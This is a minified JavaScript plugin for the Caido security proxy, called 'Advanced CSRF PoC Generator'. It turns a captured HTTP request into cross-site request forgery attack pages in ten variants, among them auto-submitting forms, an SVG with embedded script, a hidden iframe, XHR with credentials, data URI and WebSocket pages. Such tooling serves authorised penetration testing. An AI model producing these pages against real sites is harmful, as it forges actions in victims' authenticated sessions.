export async function init(n){const e=document.createElement("style");e.textContent="\n    .csrf-modal-overlay {\n      position: fixed;\n      top: 0;\n      left: 0;\n      right: 0;\n      bottom: 0;\n      background-color: rgba(0, 0, 0, 0.85);\n      display: flex;\n      justify-content: center;\n      align-items: center;\n      z-index: 1000;\n    }\n\n    .csrf-modal {\n      background-color: #1a1a1a;\n      border-radius: 12px;\n      width: 85%;\n      max-width: 1200px;\n      max-height: 90vh;\n      display: flex;\n      flex-direction: column;\n      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.24);\n    }\n\n    .csrf-modal-header {\n      padding: 20px 24px;\n      background-color: #252525;\n      border-bottom: 1px solid #333;\n      border-radius: 12px 12px 0 0;\n      display: flex;\n      justify-content: space-between;\n      align-items: center;\n    }\n\n    .csrf-modal-title {\n      color: #00bcd4;\n      font-size: 20px;\n      font-weight: 600;\n      letter-spacing: 0.5px;\n    }\n\n    .csrf-modal-close {\n      background: none;\n      border: none;\n      color: #999;\n      cursor: pointer;\n      font-size: 24px;\n      padding: 8px;\n      transition: color 0.2s;\n    }\n\n    .csrf-modal-close:hover {\n      color: #fff;\n    }\n\n    .csrf-modal-body {\n      padding: 24px;\n      overflow-y: auto;\n      max-height: calc(90vh - 70px);\n    }\n\n    .csrf-options {\n      background-color: #252525;\n      padding: 20px;\n      border-radius: 8px;\n      margin-bottom: 24px;\n      border: 1px solid #333;\n    }\n\n    .csrf-select {\n      width: 100%;\n      padding: 10px 12px;\n      background-color: #2d2d2d;\n      color: #fff;\n      border: 1px solid #444;\n      border-radius: 6px;\n      margin-bottom: 12px;\n      font-size: 14px;\n      transition: border-color 0.2s;\n    }\n\n    .csrf-select:hover {\n      border-color: #666;\n    }\n\n    .csrf-select:focus {\n      border-color: #00bcd4;\n      outline: none;\n    }\n\n    .csrf-checkbox-label {\n      display: flex;\n      align-items: center;\n      gap: 10px;\n      color: #ddd;\n      font-size: 14px;\n    }\n\n    .csrf-output {\n      background-color: #252525;\n      padding: 20px;\n      border-radius: 8px;\n      border: 1px solid #333;\n    }\n\n    .csrf-output-header {\n      display: flex;\n      justify-content: space-between;\n      align-items: center;\n      margin-bottom: 16px;\n    }\n\n    .csrf-button-group {\n      display: flex;\n      gap: 12px;\n    }\n\n    .csrf-button {\n      padding: 8px 16px;\n      border: none;\n      border-radius: 6px;\n      color: #fff;\n      cursor: pointer;\n      font-weight: 500;\n      font-size: 14px;\n      transition: transform 0.1s, opacity 0.2s;\n      display: flex;\n      align-items: center;\n      gap: 6px;\n    }\n\n    .csrf-button:hover {\n      transform: translateY(-1px);\n    }\n\n    .csrf-button:active {\n      transform: translateY(0);\n    }\n\n        .csrf-button-copy {\n      background-color: #a0213e;\n    }\n\n    .csrf-button-copy:hover {\n      background-color: #a0213e;\n    }\n\n    .csrf-button-download {\n      background-color: #a0213e;\n    }\n\n    .csrf-button-download:hover {\n      background-color: #a0213e;\n    }\n\n\n    .csrf-code-editor {\n      width: 100%;\n      min-height: 300px;\n      resize: vertical;\n      background-color: #2d2d2d;\n      color: #eee;\n      border: 1px solid #444;\n      border-radius: 6px;\n      padding: 16px;\n      font-family: 'Fira Code', Consolas, Monaco, monospace;\n      font-size: 14px;\n      line-height: 1.5;\n      tab-size: 2;\n      -moz-tab-size: 2;\n      outline: none;\n      transition: border-color 0.2s;\n    }\n\n    .csrf-code-editor:focus {\n      border-color: #00bcd4;\n    }\n\n    .csrf-footer {\n      padding: 16px 24px;\n      background-color: #252525;\n      border-top: 1px solid #333;\n      border-radius: 0 0 12px 12px;\n      display: flex;\n      justify-content: space-between;\n      align-items: center;\n    }\n\n    .csrf-footer-links {\n      display: flex;\n      gap: 16px;\n    }\n\n    .csrf-footer-link {\n      color: #00bcd4;\n      text-decoration: none;\n      font-size: 14px;\n      display: flex;\n      align-items: center;\n      gap: 6px;\n      transition: color 0.2s;\n    }\n\n    .csrf-footer-link:hover {\n      color: #26c6da;\n    }\n\n    .csrf-footer-link svg {\n      width: 16px;\n      height: 16px;\n    }\n\n    [data-tooltip] {\n      position: relative;\n    }\n\n    [data-tooltip]:hover:after {\n      content: attr(data-tooltip);\n      position: absolute;\n      bottom: 100%;\n      left: 50%;\n      transform: translateX(-50%);\n      padding: 4px 8px;\n      background: rgba(0, 0, 0, 0.8);\n      color: white;\n      font-size: 12px;\n      border-radius: 4px;\n      white-space: nowrap;\n      z-index: 10;\n    }\n  ",document.head.appendChild(e);const t=(e,t,o)=>{const r=(n=>{try{const e=n.split("\n");let t="",o="",r=!1;for(const n of e)n.toLowerCase().startsWith("content-type:")&&(o=n.split(":")[1].trim()),""!==n.trim()?r&&(t+=n):r=!0;if(!t.trim())return[];if(o.includes("application/json"))try{const n=JSON.parse(t);return Object.entries(n).map((([n,e])=>({name:n,value:"object"==typeof e?JSON.stringify(e):String(e)})))}catch(n){return console.error("JSON parsing failed:",n),[]}return t.split("&").filter((n=>n.includes("="))).map((n=>{const[e,...t]=n.split("=");return{name:decodeURIComponent(e),value:decodeURIComponent(t.join("="))}}))}catch(n){return console.error("Parameter parsing error:",n),[]}})(e);0===r.length&&n.window.showToast("No parameters found in request",{variant:"warning"});const a=document.createElement("div");a.className="csrf-modal-overlay",a.addEventListener("click",(n=>{n.target===a&&a.remove()})),(n=>{const e=t=>{"Escape"===t.key&&(n.remove(),document.removeEventListener("keydown",e))};document.addEventListener("keydown",e)})(a);const c=document.createElement("div");c.className="csrf-modal",c.addEventListener("click",(n=>n.stopPropagation()));const s=document.createElement("div");s.className="csrf-modal-header";const i=document.createElement("div");i.className="csrf-modal-title",i.textContent="Advanced CSRF PoC Generator";const d=document.createElement("button");d.className="csrf-modal-close",d.innerHTML="&times;",d.onclick=()=>a.remove(),s.appendChild(i),s.appendChild(d);const l=document.createElement("div");l.className="csrf-modal-body";const p=document.createElement("div");p.className="csrf-options";const m=document.createElement("select");m.className="csrf-select";["Standard HTML Form","URL-encoded form","Multipart form","Plain text form","SVG-based CSRF","XHR-based CSRF","Iframe-based CSRF","Meta Refresh CSRF","WebSocket CSRF","Data URI CSRF"].forEach((n=>{const e=document.createElement("option");e.value=n,e.textContent=n,m.appendChild(e)}));const u=document.createElement("label");u.className="csrf-checkbox-label";const h=document.createElement("input");h.type="checkbox",h.checked=!0,u.appendChild(h),u.appendChild(document.createTextNode("Include auto-submit script (where applicable)")),p.appendChild(m),p.appendChild(u);const f=()=>{let e;switch(m.value){case"URL-encoded form":e=((n,e,t,o)=>{const r=t.map((({name:n,value:e})=>`    <input type="hidden" name="${n}" value="${e}" />`)).join("\n");return`<!DOCTYPE html>\n  <html>\n  <head>\n      <title>CSRF PoC</title>\n  </head>\n  <body>\n      <h3>URL-encoded CSRF PoC</h3>\n      <form action="${e}" method="${n.toLowerCase()}" enctype="application/x-www-form-urlencoded">\n  ${r}\n          <input type="submit" value="Submit request" />\n      </form>\n      ${o?"<script>\n          history.pushState('', '', '/');\n          document.forms[0].submit();\n      <\/script>":""}\n  </body>\n  </html>`})(o,t,r,h.checked);break;case"Multipart form":e=((n,e,t,o)=>{Math.random().toString(36).slice(2);const r=t.map((({name:n,value:e})=>`    <input type="hidden" name="${n}" value="${e}" />`)).join("\n");return`<!DOCTYPE html>\n  <html>\n  <head>\n      <title>CSRF PoC</title>\n  </head>\n  <body>\n      <h3>Multipart CSRF PoC</h3>\n      <form action="${e}" method="${n.toLowerCase()}" enctype="multipart/form-data">\n  ${r}\n          <input type="submit" value="Submit request" />\n      </form>\n      ${o?"<script>\n          history.pushState('', '', '/');\n          document.forms[0].submit();\n      <\/script>":""}\n  </body>\n  </html>`})(o,t,r,h.checked);break;case"Plain text form":e=((n,e,t,o)=>{const r=t.map((({name:n,value:e})=>`${n}=${e}`)).join("\n");return`<!DOCTYPE html>\n  <html>\n  <head>\n      <title>CSRF PoC</title>\n  </head>\n  <body>\n      <h3>Plain Text CSRF PoC</h3>\n      <form action="${e}" method="${n.toLowerCase()}" enctype="text/plain">\n          <input type="hidden" name="${r}" value="" />\n          <input type="submit" value="Submit request" />\n      </form>\n      ${o?"<script>\n          history.pushState('', '', '/');\n          document.forms[0].submit();\n      <\/script>":""}\n  </body>\n  </html>`})(o,t,r,h.checked);break;case"SVG-based CSRF":e=((n,e,t,o=200)=>{const r=t.map((({name:n,value:e})=>`<input type="hidden" name="${n}" value="${e}">`)).join("");return`<?xml version="1.0" standalone="no"?>\n  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n  <svg width="${o}" height="${o}" version="1.1" xmlns="http://www.w3.org/2000/svg">\n      <rect width="${o}" height="${o}" fill="#f0f0f0"/>\n      <circle cx="${o/2}" cy="${o/2}" r="${o/3}" fill="#ddd"/>\n      <text x="${o/2}" y="${o/2}" text-anchor="middle" font-family="Arial" fill="#666">Loading...</text>\n      \n      <script type="text/javascript"><![CDATA[\n          function submitCSRF() {\n              var w = window.open('about:blank', '_blank');\n              w.document.write(\`\n                  <html>\n                  <body>\n                      <form method="${n.toLowerCase()}" action="${e}">\n                          ${r}\n                      </form>\n                      <script>\n                          document.forms[0].submit();\n                      <\/script>\n                  </body>\n                  </html>\n              \`);\n              w.document.close();\n          }\n          submitCSRF();\n      ]]><\/script>\n  </svg>`})(o,t,r,200);break;case"XHR-based CSRF":e=((n,e,t,o)=>{const r=t.map((({name:n,value:e})=>`${encodeURIComponent(n)}=${encodeURIComponent(e)}`)).join("&");return`<!DOCTYPE html>\n  <html>\n  <head>\n      <title>CSRF PoC</title>\n  </head>\n  <body>\n      <h3>XHR CSRF PoC</h3>\n      <script>\n      function sendXHR() {\n          var xhr = new XMLHttpRequest();\n          xhr.open("${n.toLowerCase()}", "${e}", true);\n          xhr.withCredentials = true;\n          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n          xhr.send("${r}");\n      }\n      ${o?"sendXHR();":""}\n      <\/script>\n      <button onclick="sendXHR()">Send Request</button>\n  </body>\n  </html>`})(o,t,r,h.checked);break;case"Iframe-based CSRF":e=((n,e,t,o)=>{const r=t.map((({name:n,value:e})=>`    <input type="hidden" name="${n}" value="${e}" />`)).join("\n");return`<!DOCTYPE html>\n<html>\n<head>\n  <title>CSRF PoC</title>\n</head>\n<body>\n  <h3>Iframe CSRF PoC</h3>\n  <iframe id="csrf-frame" style="display:none"></iframe>\n  <form id="csrf-form" target="csrf-frame" action="${e}" method="${n.toLowerCase()}">\n${r}\n  </form>\n  <script>\n      function submitForm() {\n          document.getElementById('csrf-form').submit();\n          setTimeout(() => {\n              document.getElementById('csrf-frame').remove();\n          }, 1000);\n      }\n      ${o?"submitForm();":""}\n  <\/script>\n  <button onclick="submitForm()">Submit Request</button>\n</body>\n</html>`})(o,t,r,h.checked);break;case"Meta Refresh CSRF":e=((n,e,t)=>{const o=t.map((({name:n,value:e})=>`<input type="hidden" name="${n}" value="${e}">`)).join("");return`<!DOCTYPE html>\n<html>\n<head>\n  <title>CSRF PoC</title>\n  <meta http-equiv="refresh" content="0; url=data:text/html;base64,${btoa(`\n  <form method="${n.toLowerCase()}" action="${e}">\n      ${o}\n  </form>\n  <script>document.forms[0].submit();<\/script>\n  `)}">\n</head>\n<body>\n  <h3>Meta Refresh CSRF PoC</h3>\n  <p>If you are not redirected, <a href="#" onclick="document.forms[0].submit()">click here</a></p>\n</body>\n</html>`})(o,t,r);break;case"WebSocket CSRF":e=((n,e,t)=>`<!DOCTYPE html>\n<html>\n<head>\n  <title>CSRF PoC</title>\n</head>\n<body>\n  <h3>WebSocket CSRF PoC</h3>\n  <script>\n      var ws = new WebSocket("${e.replace("https://","wss://").replace("http://","ws://")}");\n      ws.onopen = function() {\n          ws.send("${t.map((({name:n,value:e})=>`${n}=${e}`)).join("&")}");\n          setTimeout(() => ws.close(), 1000);\n      };\n  <\/script>\n</body>\n</html>`)(0,t,r);break;case"Data URI CSRF":e=((n,e,t,o)=>{const r=t.map((({name:n,value:e})=>`    <input type="hidden" name="${n}" value="${e}" />`)).join("\n"),a=`<!DOCTYPE html>\n<html>\n<head>\n  <title>CSRF PoC</title>\n</head>\n<body>\n  <h3>Data URI CSRF PoC</h3>\n  <form action="${e}" method="${n.toLowerCase()}">\n${r}\n  </form>\n  ${o?"<script>document.forms[0].submit();<\/script>":""}\n</body>\n</html>`;return`<script>window.location='data:text/html;base64,${btoa(a)}';<\/script>`})(o,t,r,h.checked);break;default:e=((n,e,t,o)=>{const r=t.map((({name:n,value:e})=>`    <input type="hidden" name="${n}" value="${e}" />`)).join("\n");return`<!DOCTYPE html>\n  <html>\n  <head>\n      <title>CSRF PoC</title>\n  </head>\n  <body>\n      <h3>Standard CSRF PoC</h3>\n      <form action="${e}" method="${n.toLowerCase()}">\n  ${r}\n          <input type="submit" value="Submit request" />\n      </form>\n      ${o?"<script>\n          history.pushState('', '', '/');\n          document.forms[0].submit();\n      <\/script>":""}\n  </body>\n  </html>`})(o,t,r,h.checked)}const a=document.createElement("div");a.className="csrf-output";const c=document.createElement("div");c.className="csrf-output-header";const s=document.createElement("div");s.textContent="Generated PoC:";const i=document.createElement("div");i.className="csrf-button-group";const d=document.createElement("button");d.className="csrf-button csrf-button-copy",d.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy PoC';const l=document.createElement("button");l.className="csrf-button csrf-button-download",l.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>Download';const p=document.createElement("textarea");p.className="csrf-code-editor",p.value=e,p.spellcheck=!1,d.onclick=async()=>{await navigator.clipboard.writeText(p.value),n.window.showToast("CSRF PoC copied to clipboard")},l.onclick=()=>{const e="SVG-based CSRF"===m.value,t=new Blob([p.value],{type:e?"image/svg+xml":"text/html"}),o=document.createElement("a");o.href=URL.createObjectURL(t),o.download=e?"csrf-poc.svg":"csrf-poc.html",o.click(),URL.revokeObjectURL(o.href),n.window.showToast("CSRF PoC downloaded as "+(e?"SVG":"HTML"))},i.appendChild(d),i.appendChild(l),c.appendChild(s),c.appendChild(i);const u=document.createElement("div");return u.textContent=`Target URL: ${t}`,u.style.marginBottom="12px",u.style.color="#888",a.appendChild(c),a.appendChild(u),a.appendChild(p),a};let b=f();m.addEventListener("change",(()=>{const n=f();b.replaceWith(n),b=n})),h.addEventListener("change",(()=>{const n=f();b.replaceWith(n),b=n}));const C=document.createElement("div");C.className="csrf-footer-links";const x=document.createElement("a");x.className="csrf-footer-link",x.innerHTML='\n    <svg viewBox="0 0 24 24" fill="currentColor">\n      <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128c.12-.094.246-.192.372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>\n    </svg>\n    Join Discord Server\n  ',x.href="#",x.addEventListener("click",(n=>{n.preventDefault(),"undefined"!=typeof __CAIDO_DESKTOP__&&__CAIDO_DESKTOP__.openInBrowser?__CAIDO_DESKTOP__.openInBrowser("https://links.caido.io/www-discord"):window.open("https://links.caido.io/www-discord","_blank","noopener,noreferrer")}));const v=document.createElement("a");v.className="csrf-footer-link",v.innerHTML='\n    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">\n      <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>\n      <path d="M22 6l-10 7L2 6"/>\n    </svg>\n    Contact Me\n  ',v.href="#",v.addEventListener("click",(n=>{n.preventDefault(),"undefined"!=typeof __CAIDO_DESKTOP__&&__CAIDO_DESKTOP__.openInBrowser?__CAIDO_DESKTOP__.openInBrowser("https://x.com/Tur24Tur"):window.open("https://x.com/Tur24Tur","_blank","noopener,noreferrer")}));const w=document.createElement("div");w.style.color="#666",w.style.fontSize="12px",w.textContent="CSRF PoC Generator v1.0.0",C.appendChild(x),C.appendChild(v);const y=document.createElement("div");y.className="csrf-footer",y.appendChild(C),y.appendChild(w),l.appendChild(p),l.appendChild(b),c.appendChild(s),c.appendChild(l),c.appendChild(y),a.appendChild(c),document.body.appendChild(a)};n.commands.register("generate-csrf-poc",{name:"Generate CSRF PoC",run:async e=>{try{const o=e.request?.raw;if(!o)return void n.window.showToast("No request selected",{variant:"error"});const r=o.split("\n")[0].split(" ")[0],a=o.match(/^(?:POST|GET|PUT|DELETE)\s+(.*?)\s+HTTP/),c=a?a[1]:"",s=o.match(/Host:\s*([^\r\n]+)/i),i=s?s[1].trim():"",d=c.startsWith("http")?c:`https://${i}${c}`;t(o,d,r)}catch(e){n.window.showToast(`Error: ${e.message}`,{variant:"error"}),console.error(e)}}}),n.menu.registerItem({type:"Request",commandId:"generate-csrf-poc"}),n.menu.registerItem({type:"RequestRow",commandId:"generate-csrf-poc"})}
